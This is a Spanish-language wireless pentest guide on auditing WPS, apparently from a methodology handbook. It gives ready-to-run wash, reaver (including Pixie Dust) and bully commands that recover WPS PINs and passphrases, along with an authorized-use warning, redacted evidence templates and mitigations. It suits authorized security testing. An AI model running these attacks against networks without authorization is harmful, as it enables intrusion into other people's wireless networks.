# WPS

> Técnica: revisar exposición de WPS y validar si el AP es vulnerable a ataques sobre PIN.

!!! warning "Uso autorizado"
    Revisar WPS únicamente en redes propias, laboratorios o auditorías autorizadas.

---

## Cuándo usar

- El AP tiene WPS activo.
- Se quiere validar si WPS expone un vector adicional.
- Se sospecha PIN débil, PIN por defecto o Pixie Dust.
- El alcance permite pruebas activas contra WPS.

---

## Variables

```bash
export MON_IFACE="wlan0mon"
export BSSID="AA:BB:CC:DD:EE:FF"
export CHANNEL="6"
export OUTDIR="$PWD/evidence"
mkdir -p "$OUTDIR"
```

---

## Enumerar WPS

```bash
sudo wash -i "$MON_IFACE"
```

Con salida a fichero:

```bash
sudo wash -i "$MON_IFACE" | tee "$OUTDIR/wps-scan.txt"
```

---

## Fijar canal

```bash
sudo iwconfig "$MON_IFACE" channel "$CHANNEL"
```

---

## Reaver básico

```bash
sudo reaver \
  -i "$MON_IFACE" \
  -b "$BSSID" \
  -c "$CHANNEL" \
  -vv
```

---

## Pixie Dust

```bash
sudo reaver \
  -i "$MON_IFACE" \
  -b "$BSSID" \
  -c "$CHANNEL" \
  -K 1 \
  -vv
```

---

## Bully

```bash
sudo bully \
  -b "$BSSID" \
  -c "$CHANNEL" \
  "$MON_IFACE"
```

---

## Usando Airgeddon

Flujo típico:

```text
1. Seleccionar interfaz
2. Activar modo monitor
3. Escanear WPS
4. Seleccionar BSSID autorizado
5. Probar Pixie Dust si aplica
6. Probar PIN si el alcance lo permite
7. Guardar resultado
```

---

## Qué buscar

| Señal | Interpretación |
|---|---|
| WPS activo | Superficie adicional |
| `WPS Locked: No` | Potencialmente testeable |
| Pixie Dust success | Hallazgo crítico/alto |
| PIN recuperado | Compromiso de WPS |
| AP bloquea WPS | Control de protección |
| Rate limit / lock | Mitigación parcial |

---

## Evidencia mínima

```text
SSID:
BSSID:
Canal:
WPS activo:
WPS locked:
Herramienta:
Resultado:
PIN recuperado: <redacted>
PSK recuperada: <redacted>
Impacto:
```

---

## Sanitización

No publicar:

```text
PIN real
PSK real
capturas completas
BSSID real de cliente
```

Usar:

```text
WPS: enabled
WPS Locked: No
Result: PIN recovered in authorized lab <redacted>
```

---

## Falsos positivos / errores comunes

- WPS aparece activo pero está bloqueado.
- Señal débil provoca errores.
- AP rate-limita intentos.
- El ataque tarda demasiado y no confirma vulnerabilidad.
- Pixie Dust no aplica a todos los chipsets/APs.
- El PIN recuperado no permite obtener PSK por configuración específica.

---

## Mitigación

- Deshabilitar WPS.
- Actualizar firmware.
- Usar WPA2/WPA3 con passphrase robusta.
- Monitorizar intentos WPS.
- Evitar PIN por defecto.